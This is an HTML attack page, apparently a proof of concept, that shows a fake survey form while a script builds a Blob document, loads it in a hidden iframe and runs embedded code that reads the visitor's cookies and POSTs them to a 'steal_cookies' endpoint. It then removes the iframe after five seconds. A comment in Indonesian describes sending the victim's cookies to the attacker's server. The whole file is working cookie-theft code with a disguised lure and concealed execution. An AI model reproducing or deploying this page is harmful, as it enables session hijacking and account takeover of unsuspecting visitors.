<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Malicious Blob Attack</title>
</head>
<body>
    <h1>Welcome to Our Survey!</h1>
    <p>Please fill out the form below:</p>
    
    <form id="fakeForm">
        <label for="name">Name:</label>
        <input type="text" id="name" name="name" required>
        <br>
        <label for="email">Email:</label>
        <input type="email" id="email" name="email" required>
        <br>
        <button type="submit">Submit</button>
    </form>

    <script>
        // Blob content with XSS vulnerability
        const blobContent = `
            <html>
            <head>
                <meta charset="UTF-8">
            </head>
            <body>
                <h1>Blob XSS Attack</h1>
                <script>
                    // Mengambil cookies korban dan mengirimnya ke server penyerang
                    const cookies = document.cookie;
                    const xhr = new XMLHttpRequest();
                    xhr.open("POST", "http://localhost:3000/steal_cookies", true);
                    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                    xhr.send("cookies=" + encodeURIComponent(cookies));
                <\/script>
            </body>
            </html>
        `;

        // Create Blob and open it in an iframe
        const blob = new Blob([blobContent], { type: "text/html;charset=utf-8" });
        const url = URL.createObjectURL(blob);

        // Open Blob in hidden iframe to bypass pop-up blocker
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = url;
        document.body.appendChild(iframe);

        setTimeout(() => {
            document.body.removeChild(iframe);
        }, 5000);
    </script>
</body>
</html>
